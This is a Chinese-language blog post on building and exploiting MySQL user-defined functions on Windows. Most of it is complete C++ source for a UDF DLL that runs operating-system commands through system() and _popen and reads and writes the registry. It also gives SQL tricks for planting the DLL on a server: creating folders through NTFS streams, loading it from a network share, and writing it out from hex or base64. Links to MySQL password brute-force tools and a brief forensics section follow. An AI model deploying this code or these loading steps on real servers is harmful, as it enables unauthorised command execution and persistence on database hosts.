## 1、MySQL UDF是什么

UDF是Mysql提供给用户实现自己功能的一个接口，为了使UDF机制起作用，函数必须用C或C ++编写，并且操作系统必须支持动态加载。这篇文章主要介绍UDF开发和利用的方法。

  

## 2、UDF开发

操作系统:Windows 10

测试环境：PHPStudy+Mysql 5.5(x64)

编译器：VS2015

### 2.1 编译器方法

- MySQL源码包

从MySQL官网下载对应版本的源码包，把MySQL对应版本的源码下载回来。将include文件夹和lib文件夹解压至C++项目路径。

http://mirror.yandex.ru/mirrors/ftp.mysql.com/Downloads/MySQL-5.5/mysql-5.5.59-winx64.zip

- VS2015配置-项目属性

  将MySQL的include、lib文件夹放到C++项目路径后。属性配置如下：

  - include：VC++目录->包含目录->添加include目录
  - lib：VC++目录->库目录->添加lib目录
  - libmysql.lib：链接器->附加依赖项->添加libmysql.lib


### 2.2 调试方法

UDF在程序代码中加入调试OutputDebugStringA();就可以输出调试的信息了。在每个分支都输出相对应的调试信息，就可以获取当前运行的状态。

```
OutputDebugStringA("--UDF:my_name()被调用");
```

### 2.3 使用UDF扩展

```
// 注册函数
CREATE FUNCTION about RETURNS string SONAME "mysql_udf_c++.dll";
// 卸载函数
Drop function about;
// 使用函数
select about();
// 验证
select * from mysql.func where name = 'cmdshell';
```

### 2.4 CPP源码思路

- 执行CMDSHELL
使用方式：

```
# 创建cmdshell函数
CREATE FUNCTION cmdshell RETURNS int SONAME "mysql_udf_c++.dll";
# 执行shell函数，如果不加路径默认路径在mysql的data目录下。例如："D:\phpStudy\MySQL\data\helllo.txt"
select cmdshell("echo hello>>helllo.txt");
# 注销cmshell这个函数
Drop function cmdshell;
```

CPP源码如下：

```
#include <winsock.h>
#include <mysql.h>  
#ifndef UNICODE
#define UNICODE
#endif
#pragma comment(lib, "netapi32.lib")

#include <stdio.h>
#include <windows.h> 
#include <lm.h>


//--------cmdshell
extern "C" __declspec(dllexport)my_bool cmdshell_init(UDF_INIT *initid, 
	UDF_ARGS *args, 
	char *message)
{   //参数长度 
	unsigned int i = 0;
	if (args->arg_count == 1
		&& args->arg_type[i] == STRING_RESULT) {
		// 返回正常
		return 0;
	}
	else {
		strcpy(
			message
			, "Expected exactly one string type parameter"
			);
		//执行失败	
		return 1;
	}
}
extern "C" __declspec(dllexport)my_ulonglong cmdshell(UDF_INIT *initid,
	UDF_ARGS *args, 
	char *result, 
	char *error)
{
    // 利用sysytem函数执行命令
	// 执行“net user >> hello.txt”命令，实际路径为D:\phpStudy\MySQL\data\hello.txt
	// 执行数字例如：select cmdshell("1");就会导致MySQL结束服务。
	return system(args->args[0]);

}
extern "C" __declspec(dllexport)void cmdshell_deinit(
	UDF_INIT *initid)
{

	if (initid->ptr)
	{
		free(initid->ptr);
	}
}
```
- 回显shell

回显shell编写尝试，跟没有回显的shell执行命令是一样的原理。
核心原理是创建一个管道，把命令结果输入管道读取出来后关闭管道。

使用方式：

```
# 创建sys_eval函数
CREATE FUNCTION sys_eval RETURNS string SONAME "mysql_udf_c++.dll";
# 执行shell函数，如果不加路径默认路径在mysql的data目录下。例如："D:\phpStudy\MySQL\data\helllo.txt"
select sys_eval("echo hello>>helllo.txt");
# 注销cmshell这个函数
Drop function sys_eval;
```

CPP源码如下：
```
#include <winsock.h>
#include <mysql.h>  


#ifndef UNICODE
#define UNICODE
#endif
#pragma comment(lib, "netapi32.lib")

#include <stdio.h>
#include <windows.h> 
#include <lm.h>


//--------
extern "C" __declspec(dllexport)my_bool sys_eval_init(UDF_INIT *initid, 
	UDF_ARGS *args, 
	char *message)
{   //参数长度
	unsigned int i = 0;
	if (args->arg_count == 1
		&& args->arg_type[i] == STRING_RESULT) {
		return 0;
	}
	else {
		strcpy(
			message
			, "Expected exactly one string type parameter"
			);
		return 1;
	}
}
extern "C" __declspec(dllexport)char*  sys_eval(UDF_INIT *initid
	, UDF_ARGS *args
	, char* result
	, unsigned long* length
	, char *is_null
	, char *error)
{
	FILE *pipe;
	char buff[1024];
	unsigned long outlen, linelen;

    // 开辟内存
	result = (char*)malloc(sizeof(char));
	outlen = 0;
    // 创建管道
	pipe = _popen(args->args[0], "r");
    // 读取管道数据
	while (fgets(buff, sizeof(buff), pipe) != NULL) {
		linelen = strlen(buff);
		result = (char*)realloc(result, outlen + linelen);
		// 把管道内容拷贝进返回结果里
		strncpy(result + outlen, buff, linelen);
		outlen = outlen + linelen;
	}
    // 关闭管道
	_pclose(pipe);
	
    // 当*is_null被设置为1时，返回值为NULL
	if (!(*result) || result == NULL) {
		*is_null = 1;
	}
	else {
		result[outlen] = 0x00;
		*length = strlen(result);
	}
    // 返回结果
	return result;

}
extern "C" __declspec(dllexport)void sys_eval_deinit(
	UDF_INIT *initid)
{

	if (initid->ptr)
	{
		free(initid->ptr);
	}
}
```

- 注册表操作

核心代码主要是以下几个注册表操作相关的API实现的
```
RegQueryInfoKey
RegEnumValue
RegQueryValueEx
RegCloseKey
RegCreateKeyEx
RegSetValueEx
RegCloseKey
```

- - 注册表读取

使用方式：

```
# 创建regread函数
CREATE FUNCTION regread RETURNS string SONAME "mysql_udf_c++.dll";
# 执行regread函数
select regread("HKEY_CURRENT_USER","Software\\Microsoft\\Internet Explorer\\Main","Start Page");
# 注销regread这个函数
Drop function regread;
```

CPP源码如下：

```
#include <winsock.h>
#include <mysql.h>  

#include <stdio.h>
#include <windows.h> 


#define MAX_KEY_LENGTH 255
#define MAX_VALUE_NAME 16383

//--------
extern "C" __declspec(dllexport)my_bool regread_init(UDF_INIT *initid,
	UDF_ARGS *args,
	char *message)
{  

	//判断参数是否正确,三个参数必须是字符串
	if (args->arg_type[0] == STRING_RESULT &&  // 主键
		args->arg_type[1] == STRING_RESULT &&  // 键项
		args->arg_type[2] == STRING_RESULT     // 键值
		)
	{
		return 0;
	}
	else {
		strcpy(
			message
			, "Expected exactly Three string type parameter"
			);
		return 1;
	}
}
extern "C" __declspec(dllexport)char*  regread(UDF_INIT *initid
	, UDF_ARGS *args
	, char* result
	, unsigned long* length
	, char *is_null
	, char *error)
{
	HKEY hRoot;
	// 判断根键
	if (strcmp("HKEY_LOCAL_MACHINE", (char*)(args->args)[0]) == 0)
		hRoot = HKEY_LOCAL_MACHINE;
	else if (strcmp("HKEY_CLASSES_ROOT", (char*)(args->args)[0]) == 0)
		hRoot = HKEY_CLASSES_ROOT;
	else if (strcmp("HKEY_CURRENT_USER", (char*)(args->args)[0]) == 0)
		hRoot = HKEY_CURRENT_USER;
	else if (strcmp("HKEY_USERS", (char*)(args->args)[0]) == 0)
		hRoot = HKEY_USERS;
	else
	{
		initid->ptr = (char *)malloc(50 + strlen((args->args)[0]));
		sprintf(initid->ptr, "unknow:%s\r\n", (args->args)[0]);
		*length = strlen(initid->ptr);
		return initid->ptr;
	}
	

	// 判断根键存不存在
	// 编码转换 char转wchar
	int len = MultiByteToWideChar(CP_ACP, 0, (args->args)[1], strlen((args->args)[1]), NULL, 0);
	wchar_t*    m_wchar = new wchar_t[len + 1];
	MultiByteToWideChar(CP_ACP, 0, (args->args)[1], strlen((args->args)[1]), m_wchar, len);
	m_wchar[len] = '\0';
	HKEY aTestKey = NULL;
	DWORD dwType = REG_SZ;
	if (RegOpenKeyEx(hRoot,
		m_wchar,
		0,
		KEY_READ,
		&aTestKey) != ERROR_SUCCESS
		)
	{
		initid->ptr = (char *)malloc(50 + strlen((args->args)[1]));
		sprintf(initid->ptr, "unknow:%s\r\n", (args->args)[1]);
		*length = strlen(initid->ptr);
		return initid->ptr;
	}	



	// 查询键项目
	TCHAR    achClass[MAX_PATH] = TEXT("");  // 指定一个字串，用于装载这个注册表项的类名 
	DWORD    cchClassName = MAX_PATH;        // 指定一个变量，用于装载lpClass缓冲区的长度。一旦返回，它会设为实际装载到缓冲区的字节数量 
	DWORD    cSubKeys = 0;                   // 子键的数目 
	DWORD    cbMaxSubKey;                    // 设置最大子键长度 
	DWORD    cchMaxClass;                    // 指定一个变量，用于装载这个项之子项的最长一个类名的长度 
	DWORD    cValues;                        // 用于装载这个项的设置值数量的一个变量
	DWORD    cchMaxValue;                    // value的最长名字
	DWORD    cbMaxValueData;                 // value的最长数据
	DWORD    cbSecurityDescriptor;           // 安全描述符的大小 
	FILETIME ftLastWriteTime;                // 上次写入的时间 

	DWORD i, retCode;
	DWORD dwSize;
	TCHAR *wStr = new TCHAR[MAX_VALUE_NAME];
	TCHAR  achValue[MAX_VALUE_NAME];
	TCHAR  data[MAX_VALUE_NAME];
	DWORD cchValue = MAX_VALUE_NAME;
	DWORD dBufSize;   //返回结果长度

	// Get the class name and the value count. 
	retCode = RegQueryInfoKey(
		aTestKey,                // 主键句柄 
		achClass,                // 指定一个字串，用于装载这个注册表项的类名
		&cchClassName,           // 指定一个变量，用于装载lpClass缓冲区的长度。一旦返回，它会设为实际装载到缓冲区的字节数量
		NULL,                    // reserved 
		&cSubKeys,               // 用于装载（保存）这个项的子项数量的一个变量
		&cbMaxSubKey,            // 指定一个变量，用于装载这个项最长一个子项的长度。注意这个长度不包括空中止字符
		&cchMaxClass,            // 指定一个变量，用于装载这个项之子项的最长一个类名的长度
		&cValues,                // 用于装载这个项的设置值数量的一个变量
		&cchMaxValue,            // 指定一个变量，用于装载这个项之子项的最长一个值名的长度
		&cbMaxValueData,         // 指定一个变量，用于装载容下这个项最长一个值数据所需的缓冲区长度
		&cbSecurityDescriptor,   // 装载值安全描述符长度的一个变量 
		&ftLastWriteTime);       // 指定一个结构，用于容纳该项的上一次修改时间 
	
	// 枚举键值. 
	// 匹配出对应的值
	if (cValues)
	{
		for (i = 0, retCode = ERROR_SUCCESS; i < cValues; i++)
		{
			cchValue = MAX_VALUE_NAME;
			dwSize = MAX_VALUE_NAME;
			achValue[0] = '\0';
			data[0] = '\0';
			retCode = RegEnumValue(aTestKey, i,
				wStr,
				&cchValue,
				NULL,
				NULL,
				NULL,
				NULL);
			RegQueryValueEx(aTestKey, wStr,
				NULL,
				&dwType,
				(LPBYTE)data,
				&dwSize);

			
			// 编码转换 char转wchar
			int len = MultiByteToWideChar(CP_ACP, 0, (char*)(args->args)[2], strlen((char*)(args->args)[2]), NULL, 0);
			wchar_t*    m_wchar = new wchar_t[len + 1];
			MultiByteToWideChar(CP_ACP, 0, (char*)(args->args)[2], strlen((char*)(args->args)[2]), m_wchar, len);
			m_wchar[len] = '\0';


			if (retCode == ERROR_SUCCESS && wcscmp(wStr, m_wchar) == 0)
			{
				//printf("\n键名：%ls\n键值：%ls", wStr, data);
				
				//获取转换所需的目标缓存大小
				dBufSize = WideCharToMultiByte(CP_OEMCP, 0, data, -1, NULL, 0, NULL, FALSE);
				 
				//分配目标缓存
				result = new char[dBufSize];
				memset(result, 0, dBufSize);
				//转换
				int nRet = WideCharToMultiByte(CP_OEMCP, 0, data, -1, result, dBufSize, NULL, FALSE);
				
			}
		}
	}
	delete[]wStr;
	RegCloseKey(aTestKey);



	// 当*is_null被设置为1时，返回值为NULL
	if (!(*result) || result == NULL) {
		*is_null = 1;
	}
	else {
		result[dBufSize] = 0x00;
		*length = strlen(result);
	}
	// 返回结果
	return result;
}
extern "C" __declspec(dllexport)void regread_deinit(
	UDF_INIT *initid)
{

	if (initid->ptr)
	{
		free(initid->ptr);
	}
}
```
- - 注册表写入
使用方式：

```
# 创建regread函数
CREATE FUNCTION regwrite RETURNS string SONAME "mysql_udf_c++.dll";
# 执行regread函数
select regwrite("HKEY_CURRENT_USER","Software\\Microsoft\\Internet Explorer\\Main","test","www.baidu.com");
# 注销regread这个函数
Drop function regwrite;
```

CPP源码如下：

```
#include <winsock.h>
#include <mysql.h>  

#include <stdio.h>
#include <windows.h> 

//--------
extern "C" __declspec(dllexport)my_bool regwrite_init(UDF_INIT *initid,
	UDF_ARGS *args,
	char *message)
{  

	//判断参数是否正确,三个参数必须是字符串
	if (args->arg_type[0] == STRING_RESULT &&  // 主键
		args->arg_type[1] == STRING_RESULT &&  // 键项
		args->arg_type[2] == STRING_RESULT &&  // 键
		args->arg_type[3] == STRING_RESULT     // 写入的值
		)
	{
		return 0;
	}
	else {
		strcpy(
			message
			, "Expected exactly four string type parameter"
			);
		return 1;
	}
}
extern "C" __declspec(dllexport)char*  regwrite(UDF_INIT *initid
	, UDF_ARGS *args
	, char* result
	, unsigned long* length
	, char *is_null
	, char *error)
{


	
	HKEY hRoot;
	// 判断根键
	if (strcmp("HKEY_LOCAL_MACHINE", (char*)(args->args)[0]) == 0)
		hRoot = HKEY_LOCAL_MACHINE;
	else if (strcmp("HKEY_CLASSES_ROOT", (char*)(args->args)[0]) == 0)
		hRoot = HKEY_CLASSES_ROOT;
	else if (strcmp("HKEY_CURRENT_USER", (char*)(args->args)[0]) == 0)
		hRoot = HKEY_CURRENT_USER;
	else if (strcmp("HKEY_USERS", (char*)(args->args)[0]) == 0)
		hRoot = HKEY_USERS;
	else
	{
		initid->ptr = (char *)malloc(50 + strlen((args->args)[0]));
		sprintf(initid->ptr, "unknow:%s\r\n", (args->args)[0]);
		*length = (unsigned long)strlen(initid->ptr);
		return initid->ptr;
	}

	HKEY hKey;
	DWORD dwType = REG_SZ;
	// 打开注册表键，不存在则创建它

	// 判断根键存不存在
	// szSubKey编码转换 char转wchar
	int szSubKey_len = (int)MultiByteToWideChar(CP_ACP, 0, (args->args)[1], strlen((args->args)[1]), NULL, 0);
	wchar_t*    szSubKey = new wchar_t[szSubKey_len + 1];
	MultiByteToWideChar(CP_ACP, 0, (args->args)[1], strlen((args->args)[1]), szSubKey, szSubKey_len);
	szSubKey[szSubKey_len] = '\0';

	size_t lRet = RegCreateKeyEx(hRoot, szSubKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
	if (lRet != ERROR_SUCCESS)
	{
		initid->ptr = (char *)malloc(50 + strlen((args->args)[1]));
		sprintf(initid->ptr, "unknow:%s\r\n", (args->args)[1]);
		*length = (unsigned long)strlen(initid->ptr);
		return initid->ptr;
	}

	// 修改注册表键值，没有则创建它
	// ValueName修改的键项转换 char转wchar
	int ValueName_len = MultiByteToWideChar(CP_ACP, 0, (args->args)[2], strlen((args->args)[2]), NULL, 0);
	wchar_t*   ValueName = new wchar_t[ValueName_len + 1];
	MultiByteToWideChar(CP_ACP, 0, (args->args)[2], strlen((args->args)[2]), ValueName, ValueName_len);
	ValueName[ValueName_len] = '\0';

	//// 注册表键值编码转换 char转wchar
	int data_len = MultiByteToWideChar(CP_ACP, 0, (args->args)[3], strlen((args->args)[3]), NULL, 0);
	wchar_t*  data = new wchar_t[data_len + 1];
	MultiByteToWideChar(CP_ACP, 0, (args->args)[3], strlen((args->args)[3]), data, data_len);
	data[data_len] = '\0';
	// 计算宽字节的长度
	DWORD iLen = (DWORD)wcslen(data);

	//注册表键值修改
	lRet = RegSetValueEx(hKey, ValueName, 0, dwType, (unsigned char*)data, sizeof(wchar_t)*data_len);
	if (lRet != ERROR_SUCCESS)
	{
		initid->ptr = (char *)malloc(50 + strlen((args->args)[2]));
		sprintf(initid->ptr, "unknow:%s\r\n", (args->args)[2]);
		*length = (unsigned long)strlen(initid->ptr);
		return initid->ptr;
	}
	RegCloseKey(hKey);


	// 当*is_null被设置为1时，返回值为NULL
	if (!(*result) || result == NULL) {
		*is_null = 1;

	}
	else {
		sprintf(result, "success");
		result[iLen] = 0x00;
		*length = strlen(result);
	}
	// 返回结果
	return result;
}
extern "C" __declspec(dllexport)void regwrite_deinit(
	UDF_INIT *initid)
{

	if (initid->ptr)
	{
		free(initid->ptr);
	}
}
```


## 3、UDF加载方法

UDF有两种加载方式，一种是修改修改MySQL配置文件。第二种则是将UDF放置在MySQL指定的插件目录中加载。

### 3.1 修改MySQL配置文件

另一种方法是用插件目录编写一个新的MySQL配置文件并将其传递给mysqld。 

- 启动参数配置

```
// 通过mysqld更改plugin的目录位置
mysqld.exe –plugin-dir=C:\\temp\\plugins\\
// 编写一个新的mysql配置文件，并通过–defaults-file参数将其传递给mysqld
mysqld.exe --defaults-file=C:\temp\my.ini
```

- my.ini配置

```
[mysqld]
plugin_dir = C:\\temp\\plugins\\
```

### 3.2 新建插件目录

```
show variables like 'plugin_dir';   # 查看路径

select 'xxx' into dumpfile 'D:\phpStudy\MySQL\lib::$INDEX_ALLOCATION';          # 新建目录lib

select 'xxx' into dumpfile 'D:\phpStudy\MySQL\lib\plugin::$INDEX_ALLOCATION';  # 新建目录plugin
```

### 3.3 导出UDF文件置扩展目录

- load_file函数

- - load_file函数支持网络路径，如果将DLL复制到网络共享中，则可以直接加载它并写入磁盘。 

```
select load_file('\\\\192.168.0.19\\share\\udf.dll') into dumpfile "D:\\phpStudy\\MySQL\\lib\\plugin\\udf.dll";
```

- 用一个十六进制编码的字符串将整个DLL文件写入磁盘。

```
// 转换为hex函数
select hex(load_file('D:\\udf.dll')) into dumpfile "D:\\udf.hex";
// 导入
select 0x4d5a...... into dumpfile "D:\\phpStudy\\MySQL\\lib\\plugin\\udf.dll";
```

- 创建一个表并将二进制数据插入到十六进制编码流中，其中的二进制数据用update语句来连接。
 
```
create table temp(data longblob); 
insert into temp(data) values (0x4d5a9....); 
update temp set data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b377a382b35ba383b369f10ab376a383b369f116b375a383b369f111b376a383b369f112b376a383b35269636877a383b300000000000000000000000000000000504500006486060070b1834b00000000); select data from temp into dump file "D:\\phpStudy\\MySQL\\lib\\plugin\\udf.dll"; 
```

- 直接在磁盘上将文件从网络共享加载到第三种方法创建的表中，使用“load data infile”语句在本地加载。像上图所示将文件转换为十六进制，并在写入磁盘时取消编辑。 

```
load data infile '\\\\192.168.0.19\\share\\udf.hex' into table temp fields terminated by '@OsandaMalith' lines terminated by '@OsandaMalith' (data); 
select unhex(data) from temp into dumpfile 'D:\\phpStudy\\MySQL\\lib\\plugin\\udf.dll'; 
```

- 使用MySQL 5.6.1和MariaDB 10.0.5中介绍的函数“to_base64”和“from_base64”上传二进制文件。 

```
# 转换为base64
select to_base64(load_file('D:\\udf.dll'));

# base64导出为DLL
select from_base64("Base64编码") into dumpfile "D:\\phpStudy\\MySQL\\lib\\plugin\\udf.dll"；
```


## 4、Mysql弱口令

### 4.1 暴力破解程序

- 工具：hydra 

- CPP

用链表实现的MYSQL、MSSQL和oracle密码暴破C程序

http://blog.51cto.com/foxhack/35604

- Python

https://github.com/chinasun021/pwd_crack/blob/master/mysql/mysql_crack.py

https://www.waitalone.cn/python-mysql-mult.html

- Go

https://github.com/netxfly/x-crack

### 4.2 MySQL口令加密解密

## 5、WEB组合利用

### 5.1 后门方法

导出Mof

### 5.2 WEB渗透测试扩展

php探针、PHPMyadmin

## 6、取证分析

```
// 查看系统信息
select @@version_compile_os,@@version_compile_machine,@@plugin_dir;

// 查看加载的函数
select * from mysql.func;
```

## 7、参考


Mysql函数扩展之UDF开发

https://blog.csdn.net/albertsh/article/details/78567661

VS2015配置C/C++-MySQL开发环境

https://blog.csdn.net/daso_csdn/article/details/54646859

MySQL UDF（自定义函数）

https://www.cnblogs.com/raker/p/4377343.html

MySQL UDF的调试方式 - debugview
https://blog.csdn.net/swotcoder/article/details/18527

详详详解MySQL UDF执行命令 

http://www.360doc.cn/article/31784658_733287732.html

利用MySQL UDF进行的一次渗透测试
https://m.sohu.com/a/224950139_354899/?pvid=000115_3w_a

24.4.2.2 UDF Calling Sequences for Aggregate Functions

https://dev.mysql.com/doc/refman/5.5/en/udf-aggr-calling.html

windows下编写mysql UDF函数的失败经历，与ubuntu下的成功编译经历

https://blog.csdn.net/watch_ch/article/details/54015948

开源项目

https://github.com/mysqludf/lib_mysqludf_sys

## 8、最终效果图

![](https://images2018.cnblogs.com/blog/549050/201805/549050-20180530203927755-1403761145.png)